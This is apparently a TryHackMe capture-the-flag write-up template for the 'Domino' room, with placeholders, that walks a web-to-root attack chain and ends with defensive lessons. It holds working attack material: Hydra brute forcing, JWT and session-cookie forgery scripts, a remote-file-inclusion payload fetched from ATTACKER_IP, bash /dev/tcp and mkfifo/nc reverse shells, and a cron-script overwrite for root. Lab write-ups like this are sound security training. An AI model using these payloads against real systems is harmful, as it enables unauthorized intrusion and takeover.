---
title: Domino — TryHackMe Writeup
platform: TryHackMe
category: Web, Linux PrivEsc
difficulty: Medium
os: Linux (Ubuntu)
stack: Apache · PHP · MySQL
flags: 5 total
room: https://tryhackme.com/room/domino
---

# Domino

> "One tile falls, they all fall."

[ONE-LINE SUMMARY OF THE BOX IN YOUR OWN WORDS — e.g. what the core bug chain was]

---

## 00 — Kill Chain

```
Phase 1 — Recon & Secret Extraction
  Nmap → dirsearch → /backup/ → app.js (AES key) → config.enc decrypted

Phase 2 — Initial Access as [USER] (user role)
  team.php (username enum) → Hydra → [USER]:[PASSWORD] → user dashboard (no admin)

Phase 3 — JWT Forgery → File API → All Secrets
  /api/auth/token.php (get JWT) → sig check bypass → forge admin JWT → read config.php → APP_SECRET

Phase 4 — Session Forge → Admin
  APP_SECRET extracted → forge admin cookie → admin panel access

Phase 5 — RFI/RCE & Lateral & Root
  files.php eval() = RFI → www-data → password reuse → [SYSTEM_USER] → writable cron script → root
```

**Tags:** Recon · Credentials · Access · Exploitation

---

## 01 — Recon & Enumeration

### Port scan

```bash
sudo nmap -sS -sV -sC [TARGET_IP] -F -T3
```

```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      [OPENSSH_VERSION]
80/tcp open  http     [APACHE_VERSION] — [PAGE_TITLE]
```

Browsing to `http://[TARGET_IP]` shows a login page for the portal.

### Directory enumeration

```bash
dirsearch -u http://[TARGET_IP]/
```

| Path | Result | Notes |
|---|---|---|
| `/backup/` | [STATUS] | [e.g. directory listing enabled — contains config.enc, README.txt] |
| `/admin/` | [STATUS] | [e.g. 403 — exists but access denied] |
| `/api/` | [STATUS] | [e.g. auth/token.php, files.php] |

[Add your own notes on anything the README or directory listing pointed you toward.]

---

## 02 — JS Secret Leak & AES Decryption

Opening `/static/app.js` (or wherever you found it) revealed a hardcoded key:

```js
// [paste the relevant config/comment block you found]
const CONFIG = {
    _backupKey: '[KEY_VALUE]',
};
```

Decrypting the backup config found in `/backup/`:

```python
from Crypto.Cipher import AES

key = b'[KEY_PADDED_TO_16_BYTES]'

with open('config.enc', 'rb') as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_ECB)
decrypted = cipher.decrypt(data)

pad_byte = decrypted[-1]
if 1 <= pad_byte <= 16:
    decrypted = decrypted[:-pad_byte]

print(decrypted.decode('utf-8'))
```

```json
[PASTE DECRYPTED OUTPUT — e.g. {"app_name":"...","system_user":"..."}]
```

**Intel extracted:** [note the key fact this handed you — e.g. an OS-level username to target later]

---

## 03 — Initial Access

### Mapping the leaked username to a real account

`/team.php` (or wherever staff info was exposed) lists employees and an email/username convention.

[Screenshot / notes of the staff directory]

Username convention: `[PATTERN]`. Target(s) identified: **[USERNAME_1]**, **[USERNAME_2]**.

### Cracking the login

```bash
hydra -l [USERNAME] -P ~/Downloads/rockyou.txt [TARGET_IP] \
  http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"
```

```
[80][http-post-form] login: [USERNAME]   password: [PASSWORD]
```

### Logging in

Logged in as `[USERNAME]` — lands on a **[ROLE] dashboard**. Session cookie observed: `[COOKIE_NAME]`.

```
[decoded cookie structure, if you dug into it]
```

**Where this leaves us:** authenticated as `[ROLE]`, need to escalate to admin for the next flag.

---

## 04 — JWT Forgery → File API → Server Secrets

### Requesting a JWT

```bash
curl -s http://[TARGET_IP]/api/auth/token.php \
  -H "Cookie: [SESSION_COOKIE]=[VALUE]"
```

```json
[PASTE TOKEN RESPONSE]
```

### Testing the file API

```bash
curl -s "http://[TARGET_IP]/api/files.php?name=[PATH]" \
  -H "Authorization: Bearer [TOKEN]"
```

```json
[PASTE RESPONSE — e.g. Admin role required]
```

### Forging an admin token

[Describe what weakness let you forge a token — e.g. signature check disabled, weak secret, alg confusion. Paste your forge script.]

```python
import hmac, hashlib, base64, json, time

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

secret = b'[SECRET_USED]'

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
payload = b64url(json.dumps({
    "sub": "[USERNAME]",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}, separators=(',', ':')))

msg = f"{header}.{payload}"
sig = hmac.new(secret, msg.encode(), hashlib.sha256).digest()
print(f"{msg}.{b64url(sig)}")
```

### Reading config.php with the forged token

```bash
curl -s "http://[TARGET_IP]/api/files.php?name=[CONFIG_PATH]" \
  -H "Authorization: Bearer [FORGED_TOKEN]"
```

```json
[PASTE CONFIG CONTENTS — DB creds, JWT_SECRET, APP_SECRET]
```

**What this gained us:** [list out: DB password, APP_SECRET, etc. — and note anything odd, e.g. mismatched secrets]

---

## 05 — Session Cookie Forge → Admin Access

Using `APP_SECRET` extracted above, forge a session cookie for the admin user:

```python
import hmac, hashlib, base64, json

secret = b'[APP_SECRET]'
payload = json.dumps(
    {"user_id": [ID], "username": "[ADMIN_USERNAME]", "role": "admin"},
    separators=(',', ':')
)
b64 = base64.b64encode(payload.encode()).decode()
sig = hmac.new(secret, b64.encode(), hashlib.sha256).hexdigest()
print(f"{b64}.{sig}")
```

Replace the session cookie in DevTools and refresh.

[Screenshot of admin dashboard]

**Flag 2 captured:** `[FLAG_2]`

---

## 06 — RFI → RCE → Flags

[Describe the vulnerable sink you found — e.g. file API fetches remote URLs and eval()s them.]

```php
[PASTE VULNERABLE SNIPPET IF YOU VIEWED SOURCE]
```

### Serving your payload

```bash
python3 -m http.server 8888
```

### Reading a flag via RFI

```php
<?php echo shell_exec('cat [FLAG_PATH]'); ?>
```

```bash
curl -s "http://[TARGET_IP]/api/files.php?name=http://[ATTACKER_IP]:8888/[PAYLOAD].php" \
  -H "Authorization: Bearer [TOKEN]"
```

### Dumping the database (if applicable)

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=[DB_NAME]', '[DB_USER]', '[DB_PASS]');
$stmt = $pdo->query('SELECT username, role, notes FROM users');
foreach ($stmt->fetchAll(PDO::FETCH_ASSOC) as $row) {
    echo $row['username'] . ' | ' . $row['role'] . ' | ' . $row['notes'] . "\n";
}
?>
```

```
[PASTE OUTPUT]
```

### Reverse shell

```php
<?php system('bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"'); ?>
```

```bash
nc -lvnp 4444
```

```
[PASTE SHELL DROP OUTPUT — id, uid=33(www-data)...]
```

**Flags captured this phase:** `[FLAG_1]`, `[FLAG_3]`

---

## 07 — Password Reuse → Lateral Movement

### pspy64 — watching root processes

```bash
# attacker machine
python3 -m http.server 8888

# target (www-data shell)
wget http://[ATTACKER_IP]:8888/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

```
[PASTE PSPY OUTPUT SHOWING THE ROOT CRON JOB]
```

### Exploring /opt

```bash
ls -la /opt
cat /opt/[SCRIPT_OR_FILE].py
```

[Note any hardcoded credentials found here.]

### su to the target account

```bash
su [SYSTEM_USER]
Password: [PASSWORD]
```

```bash
ssh [SYSTEM_USER]@[TARGET_IP]
cat ~/user.txt
```

**Flag 4 captured:** `[FLAG_4]`

---

## 08 — Cron PrivEsc → Root

```bash
ls -la /opt/monitoring
cat /opt/monitoring/[CRON_SCRIPT].sh
```

```
[PASTE PERMISSIONS SHOWING GROUP-WRITABLE / WORLD-WRITABLE ROOT CRON SCRIPT]
```

Overwrite it with a reverse shell:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [ATTACKER_IP] 9999 >/tmp/f' \
  > /opt/monitoring/[CRON_SCRIPT].sh
```

```bash
nc -lvnp 9999
```

Wait for the cron tick.

```
[PASTE ROOT SHELL DROP]
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

**Flag 5 captured. Root.**

---

## 09 — Vulnerability Chain

| # | Vulnerability | Where | Impact |
|---|---|---|---|
| V1 | [e.g. Hardcoded AES key in frontend JS] | `[FILE]` | [impact] |
| V2 | [e.g. Weak/crackable password] | `[USER]` | [impact] |
| V3 | [e.g. JWT signature verification disabled] | `[FILE]` | [impact] |
| V4 | [e.g. Unrestricted file read via API] | `[FILE]` | [impact] |
| V5 | [e.g. Forgeable session cookie] | — | [impact] |
| V6 | [e.g. RFI + eval() → RCE] | `[FILE]` | [impact] |
| V7 | [e.g. Password reuse DB → OS account] | — | [impact] |
| V8 | [e.g. World/group-writable root cron script] | `[FILE]` | [impact] |

---

## 10 — Key Takeaways

1. **Secrets don't belong in client-side code.** Anything shipped to the browser — JS, CSS, even "hidden" comments — is public by definition. An encryption key sitting in a frontend file defeats the encryption entirely, no matter how strong the cipher is.
2. **Signature checks are only useful if they actually run.** A commented-out `hash_equals()` call turns a JWT into a glorified base64 string — the server will happily trust any payload an attacker hands it, real signature or not.
3. **Authenticated doesn't mean authorized.** Giving every logged-in user the ability to *request* a token isn't the same as controlling what that token can *do*. Role checks have to be enforced server-side on every privileged action, not just at login.
4. **User-supplied input should never build a filesystem path.** A file-read endpoint with no allowlist or `realpath()` validation is a straight line to reading every secret on the box — config files, source code, all of it.
5. **`eval()` on anything remote-controlled is a standing RCE.** If a feature needs to pull in external data, parse it as data (JSON, plain text) — never execute it as code. This single design choice is what turned a file-read bug into a full shell.
6. **One password, reused everywhere, removes every boundary between accounts.** A database password that also happens to be an OS user's password collapses the separation between "web app compromise" and "server compromise" into one step.
7. **Root-owned doesn't mean root-protected.** A script that only root can *read* but that a lower-privileged group can *write* is still fully under attacker control — cron will execute whatever's in that file the next time it ticks, no questions asked.

**The pattern across all of it:** no single bug here was exotic — a leaked key, a disabled check, a missing allowlist, a reused password, a loose file permission. What made the box fall completely was that each small misconfiguration fed directly into the next one. That's the real lesson of "Domino": defense-in-depth fails when every layer has the same kind of small hole.

---

*Flags: 5/5 · Root achieved · [1 Hour 30 Mins]*
